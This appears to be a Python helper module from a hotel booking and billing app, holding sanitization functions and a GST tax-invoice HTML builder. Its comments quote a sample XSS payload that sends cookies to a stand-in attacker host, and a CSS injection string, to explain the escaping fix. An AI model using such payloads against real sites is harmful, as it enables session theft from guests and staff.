import html as _html
import httpx, base64, re, secrets, time, logging
from datetime import datetime
import pytz

logger = logging.getLogger(__name__)
IST = pytz.timezone("Asia/Kolkata")


# ── HTML / CSS / URL sanitization helpers ──────────────────────────────────
# Hotel branding fields (hotel_name, tagline, primary_color, logo_url, …) are
# admin-controlled and were previously interpolated raw into HTML templates
# in services/helpers.build_bill_html and routes/guest_pages.themed. A
# malicious tagline like  </style><script>fetch('//attacker?'+document.cookie)
# </script>  rendered to every guest hitting /register/{slug} or downloading
# their PDF bill. The helpers below escape the value for the destination
# context (HTML element/attribute, CSS color, font name, URL).
#
# Anywhere a hotel- or guest-controlled string is interpolated into HTML/CSS
# from now on, route the value through one of these.

_HEX_COLOR_RE = re.compile(r"^#[0-9A-Fa-f]{3,8}$")
_FONT_NAME_RE = re.compile(r"^[A-Za-z0-9 \-]{1,40}$")
_SAFE_URL_SCHEMES = ("http://", "https://", "mailto:", "tel:")


def html_escape(value) -> str:
    """Escape for HTML element text or quoted attribute value.

    Returns "" for None to keep optional fields tidy. `quote=True` so this is
    safe inside `<x attr="...">` as well.
    """
    if value is None:
        return ""
    return _html.escape(str(value), quote=True)


def safe_color(value, default: str) -> str:
    """Allow only #RGB/#RRGGBB/#RRGGBBAA hex; otherwise fall back to default.

    CSS injection (`#fff;}body{display:none`) was viable when these were
    interpolated raw into a `<style>` block. The default itself is also
    validated so callers can't accidentally pass a non-hex literal.
    """
    s = "" if value is None else str(value).strip()
    if _HEX_COLOR_RE.match(s):
        return s
    if _HEX_COLOR_RE.match(default or ""):
        return default
    return "#000000"


def safe_font(value, default: str = "Outfit") -> str:
    """Strict whitelist for Google-Font-style names: letters / digits / space / `-`.

    The result is safe inside both a CSS rule and the Google Fonts URL query
    string. Anything else falls back to `default`.
    """
    s = "" if value is None else str(value).strip()
    return s if _FONT_NAME_RE.match(s) else default


def safe_url(value, default: str = "") -> str:
    """Allow only http(s)/mailto/tel URLs; HTML-escape what we keep.

    Strips javascript:, data:, vbscript:, file: and other schemes that
    enable XSS when placed in an `href`/`src`. Empty / disallowed values
    return `default` (which the caller is expected to keep trusted).
    """
    s = "" if value is None else str(value).strip()
    if not s:
        return default
    lo = s.lower()
    if any(lo.startswith(p) for p in _SAFE_URL_SCHEMES):
        return _html.escape(s, quote=True)
    return default

def booking_id() -> str:
    """Generate a non-predictable booking id.

    The legacy version was `"BK" + str(int(time.time()*1000))[-10:]` — a
    pure timestamp suffix that:
      * collided whenever two bookings landed in the same millisecond
        (across hotels too), causing `INSERT … ON CONFLICT DO NOTHING` to
        silently drop the loser;
      * was trivially enumerable: knowing one id let you guess neighbours
        and hit the previously-unauthenticated /api/guest/charges,
        /api/guest/bill paths.

    We keep the human-friendly "BK" prefix and short timestamp prefix so
    operators can still eyeball recency, then append 6 hex chars from a
    CSPRNG (24 bits of entropy on top of the timestamp).
    """
    return "BK" + str(int(time.time() * 1000))[-7:] + secrets.token_hex(3).upper()

def request_id() -> str:
    """Same shape as booking_id, prefix `SR`. See booking_id()."""
    return "SR" + str(int(time.time() * 1000))[-7:] + secrets.token_hex(3).upper()

def ist_now() -> datetime: return datetime.now(IST)

def fmt_date(d) -> str:
    if not d: return "—"
    try:
        if isinstance(d, str): d = datetime.fromisoformat(d.replace("Z","+00:00"))
        return d.astimezone(IST).strftime("%d %b %Y")
    except: return str(d).split("T")[0]

def calc_nights(ci, co) -> int:
    try:
        if isinstance(ci, str): ci = datetime.strptime(ci.split("T")[0], "%Y-%m-%d")
        if isinstance(co, str): co = datetime.strptime(co.split("T")[0], "%Y-%m-%d")
        return max((co.date()-ci.date()).days, 1)
    except: return 1

def categorize_service(name: str) -> tuple:
    s = name.lower()
    if any(w in s for w in ["food","breakfast","lunch","dinner","coffee","tea","snack","juice","water bottle","cold drink","minibar","meal","biryani","roti","rice"]):
        return "Food", "Kitchen"
    if any(w in s for w in ["laundry","wash","iron","press","dry clean"]):
        return "Laundry", "Laundry"
    if any(w in s for w in ["clean","housekeeping","towel","pillow","toiletri","amenity","extra bed","blanket"]):
        return "Housekeeping", "Housekeeping"
    if any(w in s for w in ["cab","taxi","car","airport","transport","pick","drop"]):
        return "Transport", "Reception"
    return "Other", "Reception"

async def html_to_pdf_b64(html: str, gotenberg_url: str) -> str:
    url = f"{gotenberg_url.rstrip('/')}/forms/chromium/convert/html"
    try:
        async with httpx.AsyncClient(timeout=30) as c:
            r = await c.post(url, files={"files": ("index.html", html.encode(), "text/html")})
            if r.status_code == 200: return base64.b64encode(r.content).decode()
    except Exception as e:
        logger.error(f"PDF error: {e}")
    return ""

def build_bill_html(booking: dict, charges: list, hotel: dict) -> str:
    now = datetime.now(IST).strftime("%d %b %Y %I:%M %p")
    # ── Sanitize all hotel- and booking-controlled strings before they hit
    # the f-string. Hotel fields are admin-editable, booking fields contain
    # guest-supplied data (name, customer_gstin). Without escaping, a guest
    # who typed `</style><script>…</script>` as their name would XSS the
    # PDF / preview that staff downloads.
    name = html_escape(booking.get("guest_name", "Guest"))
    room = html_escape(booking.get("room_number", ""))
    bid  = html_escape(booking.get("booking_id", ""))
    ci   = html_escape(fmt_date(booking.get("checkin_date")))
    co   = html_escape(fmt_date(booking.get("checkout_date")))
    payment_mode = html_escape(booking.get("payment_mode", "—"))
    hn   = html_escape(hotel.get("hotel_name", "Hotel"))
    logo = safe_url(hotel.get("logo_url", ""))
    pri  = safe_color(hotel.get("primary_color"), "#c8a84b")
    sec  = safe_color(hotel.get("secondary_color"), "#1a2942")
    addr = html_escape(hotel.get("address", ""))
    city = html_escape(hotel.get("city", ""))
    ph   = html_escape(hotel.get("hotel_whatsapp") or hotel.get("emergency_number", ""))
    tag  = html_escape(hotel.get("tagline", ""))

    by_date: dict = {}
    grand = paid = 0.0
    cgst_total = sgst_total = igst_total = 0.0
    inter_state = False
    for c in charges:
        dk = str(c.get("charge_date","")).split("T")[0]
        by_date.setdefault(dk,[]).append(c)
        grand += float(c.get("total",0))
        cgst_total += float(c.get("cgst_amount") or 0)
        sgst_total += float(c.get("sgst_amount") or 0)
        igst_total += float(c.get("igst_amount") or 0)
        if c.get("is_inter_state"):
            inter_state = True
        if c.get("payment_status") == "Paid": paid += float(c.get("total",0))
    tax_total = cgst_total + sgst_total + igst_total
    taxable_total = grand - tax_total

    rows = ""
    for dk in sorted(by_date.keys()):
        dt = sum(float(c.get("total",0)) for c in by_date[dk])
        rows += f'<tr class="dh"><td colspan="4">{html_escape(fmt_date(dk))}</td><td style="text-align:right">₹{dt:,.0f}</td></tr>'
        for c in by_date[dk]:
            ic = "✓" if c.get("payment_status")=="Paid" else "●"
            hsn = html_escape(c.get("hsn_code") or "")
            svc_type = html_escape(c.get("service_type", ""))
            svc_desc = html_escape(c.get("description", ""))
            rows += (f'<tr><td><span class="tg">{svc_type}</span></td>'
                     f'<td>{svc_desc}</td>'
                     f'<td style="text-align:center;font-family:monospace;font-size:10px;color:#888">{hsn}</td>'
                     f'<td style="text-align:center">{ic}</td>'
                     f'<td style="text-align:right">₹{float(c.get("total",0)):,.0f}</td></tr>')

    balance = max(grand-paid,0)
    bc = "#e74c3c" if balance>0 else "#27ae60"
    bt = f"₹{balance:,.0f}" if balance>0 else "✓ FULLY PAID"
    logo_h = f'<img src="{logo}" style="height:55px;object-fit:contain;margin-bottom:7px"><br>' if logo else ""

    # B2B / GST: if hotel has GSTIN configured, render this as a TAX INVOICE.
    seller_gstin   = html_escape((hotel.get("gstin") or "").strip())
    customer_gstin = html_escape((booking.get("customer_gstin") or "").strip())
    invoice_kind = "TAX INVOICE" if seller_gstin else "GUEST FOLIO"
    seller_gstin_html = (
        f'<div style="font-size:11px;color:#666;margin-top:2px"><b>GSTIN:</b> {seller_gstin}</div>'
        if seller_gstin else ""
    )
    customer_gstin_box = (
        f'<div class="ib"><label>Customer GSTIN</label><p style="font-family:monospace;font-size:11px">{customer_gstin}</p></div>'
        if customer_gstin else ""
    )

    # Tax breakdown rows (CGST/SGST for intra-state; IGST for inter-state).
    # Falls back gracefully for legacy charges that don't carry the split yet.
    if tax_total > 0:
        if inter_state or igst_total > 0:
            tax_rows = (
                f'<tr><td>Taxable Value</td><td style="text-align:right">₹{taxable_total:,.0f}</td></tr>'
                f'<tr><td>IGST</td><td style="text-align:right">₹{igst_total:,.0f}</td></tr>'
            )
        else:
            tax_rows = (
                f'<tr><td>Taxable Value</td><td style="text-align:right">₹{taxable_total:,.0f}</td></tr>'
                f'<tr><td>CGST</td><td style="text-align:right">₹{cgst_total:,.0f}</td></tr>'
                f'<tr><td>SGST</td><td style="text-align:right">₹{sgst_total:,.0f}</td></tr>'
            )
    else:
        tax_rows = ""

    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<style>*{{margin:0;padding:0;box-sizing:border-box;}}
body{{font-family:Arial,sans-serif;font-size:13px;color:#333;background:#fff;padding:22px;}}
.hdr{{text-align:center;border-bottom:3px solid {pri};padding-bottom:14px;margin-bottom:18px;}}
.hdr h1{{font-size:21px;color:{sec};letter-spacing:.5px;}}
.hdr .sub{{color:{pri};font-size:11px;}}
.ig{{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px;}}
.ib{{background:#f8f6f0;padding:10px;border-radius:4px;}}
.ib label{{font-size:10px;text-transform:uppercase;color:#999;letter-spacing:.5px;}}
.ib p{{font-weight:bold;margin-top:2px;}}
table{{width:100%;border-collapse:collapse;margin-bottom:16px;}}
th{{background:{sec};color:{pri};padding:8px 7px;text-align:left;font-size:11px;text-transform:uppercase;}}
td{{padding:6px 7px;border-bottom:1px solid #eee;font-size:12px;}}
.dh td{{background:#f0ece0;font-weight:bold;color:{sec};font-size:11px;padding:5px 7px;}}
.tg{{background:{sec};color:#fff;padding:1px 5px;border-radius:3px;font-size:10px;}}
.tot{{float:right;width:240px;}}
.tot td{{padding:5px 7px;font-size:12px;}}
.grand{{background:{sec};color:{pri};font-weight:bold;font-size:13px;}}
.ftr{{clear:both;text-align:center;margin-top:26px;padding-top:12px;border-top:1px solid #ddd;color:#999;font-size:11px;}}
</style></head><body>
<div class="hdr">
  {logo_h}<h1>{hn}</h1><div class="sub">{tag}</div>
  <div style="font-size:11px;color:#888;margin-top:3px">{addr}{", "+city if city else ""}{(" · "+ph) if ph else ""}</div>
  {seller_gstin_html}
  <div style="font-size:11px;color:#888;margin-top:2px">{invoice_kind} · {now}</div>
</div>
<div class="ig">
  <div class="ib"><label>Guest</label><p>{name}</p></div>
  <div class="ib"><label>Room</label><p>{room}</p></div>
  <div class="ib"><label>Check-in</label><p>{ci}</p></div>
  <div class="ib"><label>Check-out</label><p>{co}</p></div>
  <div class="ib"><label>Booking ID</label><p style="font-family:monospace;font-size:11px">{bid}</p></div>
  <div class="ib"><label>Payment</label><p>{payment_mode}</p></div>
  {customer_gstin_box}
</div>
<table>
  <thead><tr><th>Category</th><th>Description</th><th style="text-align:center">HSN/SAC</th><th style="text-align:center">Status</th><th style="text-align:right">Amount</th></tr></thead>
  <tbody>{rows or '<tr><td colspan="5" style="text-align:center;color:#999;padding:14px">No charges on file</td></tr>'}</tbody>
</table>
<div class="tot"><table>
  <tr><td>Subtotal</td><td style="text-align:right">₹{grand:,.0f}</td></tr>
  {tax_rows}
  <tr><td>Amount Paid</td><td style="text-align:right">₹{paid:,.0f}</td></tr>
  <tr><td style="color:{bc}">Balance Due</td><td style="text-align:right;color:{bc}"><b>{bt}</b></td></tr>
  <tr class="grand"><td>GRAND TOTAL</td><td style="text-align:right">₹{grand:,.0f}</td></tr>
</table></div>
<div class="ftr"><p>Thank you for staying at {hn}! 🙏</p><p style="margin-top:3px">Computer-generated bill · {hn}</p></div>
</body></html>"""
